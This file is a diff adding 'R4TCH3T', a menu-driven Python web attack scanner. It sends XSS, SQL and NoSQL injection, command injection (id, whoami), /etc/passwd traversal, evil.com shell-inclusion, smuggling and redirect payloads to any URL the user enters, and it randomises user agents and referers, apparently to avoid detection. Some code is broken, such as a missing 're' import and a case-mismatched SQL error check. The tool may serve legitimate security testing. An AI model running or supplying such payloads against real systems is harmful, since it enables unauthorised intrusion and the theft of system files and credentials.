@@ -1,0 +1,778 @@
+import requests
+import threading
+import pyfiglet
+import json
+import time
+import random
+import subprocess  # For PDF generation (if needed)
+from colorama import Fore, Style, init
+from urllib.parse import urljoin, urlparse, parse_qs
+from faker import Faker
+from bs4 import BeautifulSoup
+from typing import List, Dict, Optional
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# --- Configuration and Constants ---
+DEFAULT_TIMEOUT = 10
+MAX_THREADS = 10  # Default, can be adjusted
+REPORT_FILE = "pentest_report.txt"
+DEFAULT_WORDLIST = "wordlist.txt"
+JWT_SECRET = "your-secret-key"  # Replace with a weak secret for JWT testing
+
+init(autoreset=True)  # Initialize colorama
+
+fake = Faker()  # Initialize Faker
+
+# --- Helper Functions ---
+def random_user_agent() -> str:
+    return fake.user_agent()
+
+def random_delay(min_delay: float = 1, max_delay: float = 3) -> None:
+    time.sleep(random.uniform(min_delay, max_delay))
+
+def random_headers() -> dict:
+    return {
+        'User-Agent': random_user_agent(),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Connection': 'close',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'Referer': f'https://www.google.com/search?q={random.randint(1, 1000)}'
+    }
+
+def get_response(url: str, method: str = "GET", data: Optional[dict] = None, params: Optional[dict] = None,
+                 headers: Optional[dict] = None, cookies: Optional[dict] = None,
+                 proxies: Optional[dict] = None, timeout: int = DEFAULT_TIMEOUT, allow_redirects: bool = True) -> Optional[requests.Response]:
+    """Sends an HTTP request with error handling and proxy support."""
+    try:
+        if not headers:
+            headers = random_headers()
+
+        response = requests.request(
+            method, url, data=data, params=params, headers=headers,
+            cookies=cookies, proxies=proxies, timeout=timeout, allow_redirects=allow_redirects, verify=False
+        )
+        response.raise_for_status()
+        return response
+
+    except requests.exceptions.RequestException as e:
+        print(f"{Fore.RED}[-] Error during request to {url}: {e}{Style.RESET_ALL}")
+        return None
+
+# --- Reporting ---
+def write_report(message: str) -> None:
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+    formatted_message = f"[{timestamp}] {message}\n"
+    print(formatted_message, end="")
+    with open(REPORT_FILE, "a") as f:
+        f.write(formatted_message)
+# --- Attack Modules --- (Same as before, but integrated into the menu-driven structure)
+
+def test_xss(url: str, proxies: Optional[dict] = None) -> None:
+    """Tests for Cross-Site Scripting vulnerabilities."""
+    xss_payloads = [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "\"'><script>alert('XSS')</script>",
+        "<svg/onload=alert('XSS')>",
+    ]
+
+    try:
+        response = get_response(url, proxies=proxies)
+        if not response: return
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+
+        for form in forms:
+            action = form.get('action')
+            method = form.get('method', 'get').lower()  # Default to GET
+            target_url = urljoin(url, action) if action else url
+
+            for payload in xss_payloads:
+                data = {}
+                for input_tag in form.find_all('input'):
+                    input_name = input_tag.get('name')
+                    if input_name:
+                        data[input_name] = payload
+
+
+                if method == 'post':
+                    response = get_response(target_url, method='POST', data=data, proxies=proxies)
+                else: # method == 'get' or default
+                    response = get_response(target_url, method='GET', params=data, proxies=proxies)
+
+                if response and payload in response.text:
+                    write_report(f"XSS Vulnerability Found: {target_url} with payload: {payload}")
+                    return  # Stop after first vulnerability found for this form
+
+        #Test parameters in the URL
+        parsed_url = urlparse(url)
+        if parsed_url.query: # if there are query parameters
+            for payload in xss_payloads:
+                for key, value in parse_qs(parsed_url.query).items():
+                    #replace the original value with the payload, reconstruct the URL
+                    attack_url = url.replace(f"{key}={value[0]}",f"{key}={payload}")
+                    response = get_response(attack_url, proxies=proxies)
+                    if response and payload in response.text:
+                        write_report(f"XSS Vulnerability Found in URL parameter: {attack_url} with payload: {payload}")
+                        return
+
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error during XSS testing: {e}{Style.RESET_ALL}")
+
+def test_sqli(url: str, proxies: Optional[dict] = None) -> None:
+    """Tests for SQL Injection vulnerabilities."""
+    sqli_payloads = [
+        "' OR 1=1 --",
+        "';--",
+        "\" OR \"\"=\"",
+        "' UNION SELECT NULL, username, password FROM users --", #Example of a more advanced payload.
+        "' OR '1'='1",
+        "admin' --"
+    ]
+
+    error_messages = [ #  Common SQL error messages
+        "SQL syntax error",
+        "mysql_fetch",
+        "Warning: mysql_",
+        "You have an error in your SQL syntax",
+        "Microsoft SQL Server"
+    ]
+
+    try:
+        response = get_response(url, proxies=proxies)
+        if not response: return
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+
+        for form in forms:
+            action = form.get('action')
+            method = form.get('method', 'get').lower()
+            target_url = urljoin(url, action) if action else url
+
+            for payload in sqli_payloads:
+                data = {}
+                for input_tag in form.find_all('input'):
+                    input_name = input_tag.get('name')
+                    if input_name:
+                        data[input_name] = payload
+
+                if method == 'post':
+                    response = get_response(target_url, method='POST', data=data, proxies=proxies)
+                else:
+                    response = get_response(target_url, method='GET', params=data, proxies=proxies)
+
+                if response:
+                    for error in error_messages:
+                        if error in response.text.lower():
+                            write_report(f"SQLi Vulnerability Found: {target_url} with payload: {payload}")
+                            return # Stop after finding a vulnerability for this form
+
+        # Test URL parameters
+        parsed_url = urlparse(url)
+        if parsed_url.query:
+            for payload in sqli_payloads:
+                for key, value in parse_qs(parsed_url.query).items():
+                    attack_url = url.replace(f"{key}={value[0]}", f"{key}={payload}")
+                    response = get_response(attack_url, proxies=proxies)
+                    if response:
+                        for error in error_messages:
+                            if error in response.text.lower():
+                                write_report(f"SQLi Vulnerability Found in URL parameter: {attack_url} with payload: {payload}")
+                                return # Stop after the first successful hit.
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error during SQLi testing: {e}{Style.RESET_ALL}")
+
+def test_command_injection(url: str, proxies: Optional[dict] = None) -> None:
+    """Tests for Command Injection vulnerabilities."""
+    command_payloads = [
+        "; id",
+        "& id",
+        "| id",
+        "`id`", # Backticks
+        "$(id)", # Command substitution
+        "; ls -la", # List files, common after successful injection
+        "& ping -c 3 127.0.0.1 &", # Background a ping, check for delay.
+        "; whoami",
+        "& whoami &"
+    ]
+
+    try:
+        response = get_response(url, proxies = proxies)
+        if not response: return
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+
+        for form in forms:
+            action = form.get('action')
+            method = form.get('method', 'get').lower()  # Default to GET
+            target_url = urljoin(url, action) if action else url
+
+            for payload in command_payloads:
+                data = {}
+                for input_tag in form.find_all('input'):
+                    input_name = input_tag.get('name')
+                    if input_name:
+                        data[input_name] = payload
+
+                if method == 'post':
+                    response = get_response(target_url, method='POST', data=data, proxies=proxies)
+                else:
+                    response = get_response(target_url, method='GET', params=data, proxies=proxies)
+
+                if response: # Check for command output
+                    if "uid=" in response.text or "root" in response.text or "total" in response.text and "drwx" in response.text:
+                        write_report(f"Command Injection Vulnerability Found: {target_url} with payload: {payload}")
+                        return # Stop after the first successful hit.
+
+        #Test URL parameters
+        parsed_url = urlparse(url)
+        if parsed_url.query:
+            for payload in command_payloads:
+                 for key, value in parse_qs(parsed_url.query).items():
+                    attack_url = url.replace(f"{key}={value[0]}", f"{key}={payload}")
+                    response = get_response(attack_url, proxies=proxies)
+                    if response: # Check for command output
+                        if "uid=" in response.text or "root" in response.text or "total" in response.text and "drwx" in response.text:
+                            write_report(f"Command Injection Vulnerability Found in URL parameter : {attack_url} with payload: {payload}")
+                            return # Stop after the first successful hit.
+
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error during Command Injection testing: {e}{Style.RESET_ALL}")
+def test_lfi_rfi(url: str, proxies: Optional[dict] = None) -> None:
+    """Tests for Local File Inclusion (LFI) and Remote File Inclusion (RFI)."""
+    lfi_payloads = [
+        "../../../../etc/passwd",
+        "../../../../etc/passwd%00",  # Null byte
+        "/etc/passwd",
+        "file:///etc/passwd"
+    ]
+    rfi_payloads = [
+        "http://evil.com/shell.php",
+        "https://evil.com/shell.php",
+        "http://evil.com/shell.php?cmd=id", #With command execution
+    ]
+    try:
+        response = get_response(url, proxies=proxies)
+        if not response:
+            return
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+
+        # Test forms
+        for form in forms:
+            action = form.get('action')
+            method = form.get('method', 'get').lower()
+            target_url = urljoin(url, action) if action else url
+
+            # Test LFI in forms
+            for payload in lfi_payloads:
+                data = {}
+                for input_tag in form.find_all('input'):
+                    input_name = input_tag.get('name')
+                    if input_name:
+                        data[input_name] = payload
+
+                if method == 'post':
+                    response = get_response(target_url, method='POST', data=data, proxies=proxies)
+                else:
+                    response = get_response(target_url, method='GET', params=data, proxies=proxies)
+
+                if response and ("root:" in response.text or "daemon:" in response.text): # Basic passwd check
+                    write_report(f"LFI Vulnerability Found: {target_url} with payload: {payload}")
+                    return
+
+            # Test RFI in forms
+            for payload in rfi_payloads:
+                data = {}
+                for input_tag in form.find_all('input'):
+                    input_name = input_tag.get('name')
+                    if input_name:
+                        data[input_name] = payload
+                if method == 'post':
+                    response = get_response(target_url, 'POST', data=data, proxies=proxies, timeout=15)  # Longer timeout for RFI
+                else:
+                    response = get_response(target_url, 'GET', params=data, proxies=proxies, timeout=15)
+
+                if response and response.status_code == 200:
+                  write_report(f"Potential RFI Vulnerability Found: {target_url} with payload {payload}")
+                  return
+
+
+        # Test URL parameters
+        parsed_url = urlparse(url)
+        if parsed_url.query:
+            # Test LFI
+            for payload in lfi_payloads:
+                for key, value in parse_qs(parsed_url.query).items():
+                    attack_url = url.replace(f"{key}={value[0]}", f"{key}={payload}")
+                    response = get_response(attack_url, proxies=proxies)
+                    if response and ("root:" in response.text or "daemon:" in response.text):
+                        write_report(f"LFI Vulnerability Found in URL parameter: {attack_url} with payload: {payload}")
+                        return
+            # Test RFI
+            for payload in rfi_payloads:
+                for key, value in parse_qs(parsed_url.query).items():
+                    attack_url = url.replace(f"{key}={value[0]}", f"{key}={payload}")
+                    response = get_response(attack_url, proxies=proxies, timeout=15)  # Longer timeout for potential RFI
+                    if response and response.status_code == 200:
+                      write_report(f"Potential RFI Vulnerability Found: {attack_url} with payload {payload}")
+                      return
+
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error during LFI/RFI testing: {e}{Style.RESET_ALL}")
+
+def test_idor(url: str, proxies: Optional[dict] = None) -> None:
+    """Tests for Insecure Direct Object References (IDOR)."""
+    # This is a very basic IDOR example, and needs context from the application
+    try:
+        response = get_response(url, proxies=proxies)
+        if not response: return
+
+        parsed_url = urlparse(url)
+        # Find a numerical ID in the URL path
+        match = re.search(r'/(\d+)', parsed_url.path)
+        if not match:
+            print(f"{Fore.YELLOW}[-] No numerical ID found in URL path for IDOR testing.{Style.RESET_ALL}")
+            return
+
+        original_id = int(match.group(1))
+        base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path.replace(str(original_id), "")
+
+        for i in range(original_id - 5, original_id + 5):  # Check a range around the original ID
+            if i == original_id:
+                continue  # Skip the original ID
+
+            attack_url = f"{base_url}{i}"
+            response = get_response(attack_url, proxies=proxies)
+
+            if response and response.status_code == 200:
+                #  In a real scenario, you'd need to compare responses
+                #  to determine if you've accessed a different object.
+                #  This is a placeholder for that more complex logic.
+                write_report(f"Potential IDOR Vulnerability Found: {attack_url} (Original ID: {original_id})")
+                return
+
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error during IDOR testing: {e}{Style.RESET_ALL}")
+
+def test_security_headers(url: str, proxies: Optional[dict] = None) -> None:
+    """Checks for the presence of security-related HTTP headers."""
+    try:
+        response = get_response(url, proxies=proxies)
+        if not response:
+            return
+
+        headers_to_check = {
+            "Strict-Transport-Security": "HSTS (Strict-Transport-Security) header is missing.",
+            "X-Frame-Options": "X-Frame-Options header is missing.",
+            "X-Content-Type-Options": "X-Content-Type-Options header is missing.",
+            "Content-Security-Policy": "CSP (Content-Security-Policy) header is missing.",
+            "X-XSS-Protection": "X-XSS-Protection header is missing.",
+            "Referrer-Policy": "Referrer-Policy header is missing."
+        }
+
+        for header, message in headers_to_check.items():
+            if header not in response.headers:
+                write_report(f"Security Header Misconfiguration: {message} on {url}")
+
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error during security header testing: {e}{Style.RESET_ALL}")
+
+def test_open_redirect(url: str, proxies: Optional[dict] = None) -> None:
+    """Tests for Open Redirect vulnerabilities."""
+    open_redirect_payloads = [
+      "//google.com",
+      "https://google.com",
+      "http://google.com",
+      "/%09/google.com"
+    ]
+    try:
+        response = get_response(url, proxies=proxies)
+        if not response:
+            return
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+
+        for form in forms:
+            action = form.get('action')
+            method = form.get('method', 'get').lower()  # Default to GET
+            target_url = urljoin(url, action) if action else url
+
+            for payload in open_redirect_payloads:
+                data = {}
+                for input_tag in form.find_all('input'):
+                    input_name = input_tag.get('name')
+                    if input_name:
+                        data[input_name] = payload
+
+                if method == 'post':
+                    response = get_response(target_url, method='POST', data=data, proxies=proxies, allow_redirects=False) # Don't follow redirects
+                else:
+                    response = get_response(target_url, method='GET', params=data, proxies=proxies, allow_redirects=False)
+
+                if response and response.status_code in (301,302,307,308) and 'Location' in response.headers:
+                    if 'google.com' in response.headers['Location']: # Check if redirected to the payload domain
+                        write_report(f"Open Redirect Vulnerability Found: {target_url} with payload: {payload}")
+                        return
+
+        #Test URL parameters
+        parsed_url = urlparse(url)
+        if parsed_url.query:
+            for payload in open_redirect_payloads:
+                for key, value in parse_qs(parsed_url.query).items():
+                    attack_url = url.replace(f"{key}={value[0]}", f"{key}={payload}")
+                    response = get_response(attack_url, proxies=proxies,allow_redirects=False)
+                    if response and response.status_code in (301,302,307,308) and 'Location' in response.headers:
+                        if 'google.com' in response.headers['Location']: # Check if redirected to the payload domain
+                            write_report(f"Open Redirect Vulnerability Found in URL parameter: {attack_url} with payload: {payload}")
+                            return
+
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error during Open Redirect testing: {e}{Style.RESET_ALL}")
+
+def test_csrf(url: str, proxies: Optional[dict] = None) -> None:
+    """Tests for Cross-Site Request Forgery (CSRF) vulnerabilities (basic check)."""
+
+    try:
+        response = get_response(url, proxies=proxies)
+        if not response: return
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+
+        for form in forms:
+            csrf_token_found = False
+            for input_tag in form.find_all('input'):
+                if 'type' in input_tag.attrs and input_tag.attrs['type'] == 'hidden':
+                    if 'csrf' in input_tag.attrs.get('name',"").lower() or 'token' in input_tag.attrs.get('name',"").lower():
+                        csrf_token_found = True
+                        break # Token found, likely not vulnerable
+            if not csrf_token_found:
+                action = form.get('action')
+                method = form.get('method', 'get').lower()  # Default to GET
+                target_url = urljoin(url, action) if action else url
+                write_report(f"Potential CSRF Vulnerability Found: No CSRF token found in form at {target_url} (Method: {method})")
+
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error during CSRF testing: {e}{Style.RESET_ALL}")
+
+def test_http_smuggling(url:str, proxies: Optional[dict] = None) -> None:
+  """
+  Tests for HTTP request smuggling
+  This is complex to test reliably without a specifically vulnerable setup
+  This function demonstrates a very basic TE.CL (Transfer-Encoding: chunked, Content-Length) check
+  """
+  try:
+    smuggling_headers = {
+        'User-Agent': random_user_agent(),  # Use a random UA
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Transfer-Encoding': 'chunked',  # Declare chunked encoding
+        'Content-Length': '4',    # Set a Content-Length...
+    }
+    # ...but send more data than declared in Content-Length, in chunked format
+    smuggling_body = "1\r\nG\r\n0\r\n\r\nX"
+
+    response = get_response(url, method='POST', headers=smuggling_headers, data=smuggling_body, proxies=proxies, timeout=10)
+
+    if response and "G" in response.text:
+          write_report(f"Potential HTTP Smuggling (TE.CL) Vulnerability Found: {url}")
+    else:
+        print(f"{Fore.YELLOW}[-] No obvious HTTP Smuggling (TE.CL) vulnerability detected.{Style.RESET_ALL}")
+
+  except Exception as e:
+    print(f"{Fore.RED}[-] Error during HTTP Smuggling testing: {e}{Style.RESET_ALL}")
+
+def test_cors_misconfiguration(url: str, proxies: Optional[dict] = None) -> None:
+    """Tests for CORS misconfigurations."""
+    try:
+        # Test with a malicious origin
+        malicious_origin = "https://evil.com"
+        headers = {
+            "Origin": malicious_origin
+        }
+        response = get_response(url, headers=headers, proxies=proxies)
+
+        if response:
+            if "Access-Control-Allow-Origin" in response.headers:
+                acao = response.headers["Access-Control-Allow-Origin"]
+                if acao == "*" or acao == malicious_origin:
+                    write_report(f"CORS Misconfiguration Found:  Access-Control-Allow-Origin is set to '{acao}' for origin {malicious_origin} on {url}")
+
+                    if "Access-Control-Allow-Credentials" in response.headers and response.headers["Access-Control-Allow-Credentials"].lower() == 'true':
+                      write_report(f"CORS Misconfiguration Found: Access-Control-Allow-Credentials is true for origin {malicious_origin} on {url}")
+
+            else:
+              print(f"{Fore.YELLOW}[-] No Access-Control-Allow-Origin header, CORS may not be in use.{Style.RESET_ALL}")
+
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error during CORS testing: {e}{Style.RESET_ALL}")
+# --- NoSQL Injection (Simplified from previous code, using the same function) ---
+def test_nosql_injection(url: str, proxies: Optional[dict] = None) -> None:
+    """Tests for NoSQL Injection (MongoDB focus)."""
+    print(Fore.YELLOW + "Starting Automated NoSQL Injection Testing...")
+    payloads = [
+        {"$ne": ""},
+        {"$gt": ""},
+        {"$exists": True},
+        {"username[$ne]": "admin"}, # Targeting a specific field
+        {"$regex": ".*"}  # Match anything using a regular expression
+     ]
+
+    try:
+        response = get_response(url, proxies=proxies)
+        if not response: return
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+
+        for form in forms:
+            action = form.get('action')
+            method = form.get('method', 'get').lower()
+            target_url = urljoin(url, action) if action else url
+
+            for payload in payloads:
+                data = {}
+                for input_tag in form.find_all('input'):
+                    input_name = input_tag.get('name')
+                    if input_name:
+                      data[input_name] = payload
+
+                if method == 'post':
+                    response = get_response(target_url, method="POST", data=data, proxies=proxies, headers={'Content-Type': 'application/json'})
+
+                else: #GET request
+                    # Convert dict payload to string for GET request
+                    params = {k: json.dumps(v) if isinstance(v, dict) else v for k,v in data.items()}
+                    response = get_response(target_url, method="GET", params=params, proxies=proxies)
+
+                if response and "error" not in response.text.lower() and len(response.text) != len(response.request.body if response.request.body else ''):
+                    write_report(f"Potential NoSQL Injection Found at {target_url} with payload {payload} (Method: {method.upper()})")
+                    return
+
+            # Test URL parameters (GET only)
+            parsed_url = urlparse(url)
+            if parsed_url.query:
+                for payload in payloads:
+                  for key, value in parse_qs(parsed_url.query).items():
+                      attack_url = url.replace(f"{key}={value[0]}", f"{key}={json.dumps(payload)}")
+                      response = get_response(attack_url, proxies=proxies)
+
+                      if response and "error" not in response.text.lower() and len(response.text) != 0: # Check if response is different
+                          write_report(f"Potential NoSQL Injection Found in URL parameter: {attack_url} with payload: {payload}")
+                          return
+
+    except Exception as e:
+      print(f"{Fore.RED}[-] Error during NoSQLi testing: {e}{Style.RESET_ALL}")
+
+def directory_enumeration(target_url: str, wordlist_path: str, extensions: List[str], proxies: Optional[dict] = None, num_threads: int = MAX_THREADS) -> None:
+    """Performs directory enumeration, now with thread control."""
+    print(Fore.YELLOW + "Starting Directory Enumeration...")
+    results = []
+
+    try:
+        with open(wordlist_path, 'r') as wordlist:
+            paths = [line.strip() for line in wordlist]
+    except FileNotFoundError:
+        print(Fore.RED + "Wordlist file not found.")
+        return
+
+    def scan_path(path: str) -> None:
+        """Scans a single path with given extensions."""
+        for ext in extensions:
+            full_url = urljoin(target_url, path + ext)
+            try:
+                response = get_response(full_url, proxies=proxies)
+                if response and response.status_code == 200:
+                    print(Fore.GREEN + f"[200] {full_url}")
+                    results.append({"url": full_url, "status": 200})
+                elif response and response.status_code == 403:
+                    print(Fore.YELLOW + f"[403] {full_url}")
+                    results.append({"url": full_url, "status": 403})
+                random_delay()  # Be a good citizen
+            except Exception as e:
+                print(f"{Fore.RED}[-] Error scanning {full_url}: {e}{Style.RESET_ALL}")
+
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = [executor.submit(scan_path, path) for path in paths]
+        for future in as_completed(futures):
+            try:
+                future.result() #  This will re-raise any exceptions.
+            except Exception as e:
+                print(f"{Fore.RED}[-] Thread raised an exception: {e}{Style.RESET_ALL}")
+
+    with open("directory_results.json", "w") as f:
+        json.dump(results, f, indent=4)  # Store results
+
+def full_scan(target_url: str, wordlist_path: str, extensions: List[str], proxies: Optional[dict] = None, num_threads: int = MAX_THREADS) -> None:
+    """Performs a full automated scan (define the attacks you want to include)."""
+    print(Fore.YELLOW + "Starting Full Automated Scan...")
+
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = [
+            executor.submit(directory_enumeration, target_url, wordlist_path, extensions, proxies, num_threads),
+            executor.submit(test_xss, target_url, proxies),
+            executor.submit(test_sqli, target_url, proxies),
+            executor.submit(test_command_injection, target_url, proxies),
+            executor.submit(test_lfi_rfi, target_url, proxies),
+            executor.submit(test_idor, target_url, proxies),
+            executor.submit(test_security_headers, target_url,proxies),
+            executor.submit(test_open_redirect, target_url, proxies),
+            executor.submit(test_csrf, target_url, proxies),
+            executor.submit(test_http_smuggling, target_url, proxies),
+            executor.submit(test_cors_misconfiguration, target_url, proxies),
+            executor.submit(test_nosql_injection, target_url, proxies),
+            # Add more attack functions here as needed
+        ]
+
+        for future in as_completed(futures):
+            try:
+                future.result()  # Handle exceptions from threads
+            except Exception as e:
+                print(f"{Fore.RED}[-] A thread raised an exception: {e}{Style.RESET_ALL}")
+
+# --- Main Menu & Program Entry Point ---
+
+def print_banner():
+    banner = pyfiglet.figlet_format("R4TCH3T")
+    print(Fore.CYAN + banner)
+    print(Fore.RED + "By Abdulrahman Majid & Maryam Talaat & Abdulrahman Tarfa\n")
+
+def main():
+    print_banner()
+    proxies = None  # Initialize proxies
+
+    while True:
+        print(Fore.CYAN + "[1] Full Automated Scan")
+        print(Fore.CYAN + "[2] Directory Enumeration")
+        print(Fore.CYAN + "[3] SQL Injection")
+        print(Fore.CYAN + "[4] NoSQL Injection")
+        print(Fore.CYAN + "[5] XSS")
+        print(Fore.CYAN + "[6] Command Injection")
+        print(Fore.CYAN + "[7] LFI/RFI")
+        print(Fore.CYAN + "[8] IDOR")
+        print(Fore.CYAN + "[9] Security Headers")
+        print(Fore.CYAN + "[10] Open Redirect")
+        print(Fore.CYAN + "[11] CSRF")
+        print(Fore.CYAN + "[12] HTTP Smuggling")
+        print(Fore.CYAN + "[13] CORS Misconfiguration")
+        print(Fore.CYAN + "[0] Exit")
+
+        choice = input(Fore.WHITE + "Choose > ")
+
+        if choice == "1":
+            target_url = input("Enter Target URL: ")
+            wordlist_path = input("Enter Wordlist Path (default: wordlist.txt): ") or DEFAULT_WORDLIST
+            extensions_input = input("Enter file extensions (comma separated, default: .php,.html,.txt): ")
+            extensions = extensions_input.split(',') if extensions_input else [".php", ".html", ".txt"]
+            proxy_input = input("Enter proxy URL (e.g., http://127.0.0.1:8080, or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            num_threads = int(input("Enter the number of threads (default: 10): ") or MAX_THREADS)
+            full_scan(target_url, wordlist_path, extensions, proxies, num_threads)
+
+        elif choice == "2":
+            target_url = input("Enter Target URL: ")
+            wordlist_path = input("Enter Wordlist Path (default: wordlist.txt): ") or DEFAULT_WORDLIST
+            extensions_input = input("Enter file extensions (comma separated, default: .php,.html,.txt): ")
+            extensions = extensions_input.split(',') if extensions_input else [".php", ".html", ".txt"]
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            num_threads = int(input("Enter the number of threads (default: 10): ") or MAX_THREADS)
+            directory_enumeration(target_url, wordlist_path, extensions, proxies, num_threads)
+
+        elif choice == "3":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_sqli(target_url, proxies)
+
+        elif choice == "4":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_nosql_injection(target_url, proxies)
+
+        elif choice == "5":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_xss(target_url, proxies)
+        
+        elif choice == "6":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_command_injection(target_url, proxies)
+
+        elif choice == "7":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_lfi_rfi(target_url, proxies)
+        
+        elif choice == "8":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_idor(target_url, proxies)
+        
+        elif choice == "9":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_security_headers(target_url, proxies)
+
+        elif choice == "10":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_open_redirect(target_url, proxies)
+
+        elif choice == "11":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_csrf(target_url, proxies)
+
+        elif choice == "12":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_http_smuggling(target_url, proxies)
+        
+        elif choice == "13":
+            target_url = input("Enter Target URL: ")
+            proxy_input = input("Enter proxy URL (or leave blank): ")
+            if proxy_input:
+                proxies = {"http": proxy_input, "https": proxy_input}
+            test_cors_misconfiguration(target_url, proxies)
+
+        elif choice == "0":
+            print(Fore.RED + "Exiting...")
+            break
+        else:
+            print(Fore.RED + "Invalid choice. Try again.")
+
+if __name__ == "__main__":
+    main()
